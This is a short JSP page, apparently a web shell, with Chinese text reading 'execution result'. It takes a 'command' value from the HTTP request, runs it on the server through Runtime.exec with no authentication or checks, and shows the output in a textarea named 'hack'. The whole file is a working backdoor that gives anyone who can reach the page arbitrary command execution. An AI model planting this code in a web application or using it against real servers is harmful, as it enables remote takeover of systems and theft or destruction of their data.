<%@ page import="java.io.*"%>
<%@ page language="java" contentType="text/html; charset=utf-8"
    pageEncoding="utf-8"%>
<!DOCTYPE html>
<html>
    
    <head>
    <meta charset="utf-8">
    <title>Insert title here</title>
    </head>

    <body>
        <h1>执行结果</h1>
        <% 
            StringBuffer result=new StringBuffer();
            String strline = "";
            String system_command = request.getParameter("command");
            try {
                Process p=Runtime.getRuntime().exec(system_command);
                BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
                while((strline=br.readLine())!=null) {
                    result.append(strline+"\n");  
                }    
            } catch(Exception ex) {
                ex.printStackTrace();
            }
        %>
        <%
            if(result!=null && result.toString().trim().equals("")==false) {
        %>
                
                <textarea name="hack" rows="20" cols="84" style="font-size:10px;"><%= result.toString() %></textarea>
        <%
            }
        %>
    </body>
</html>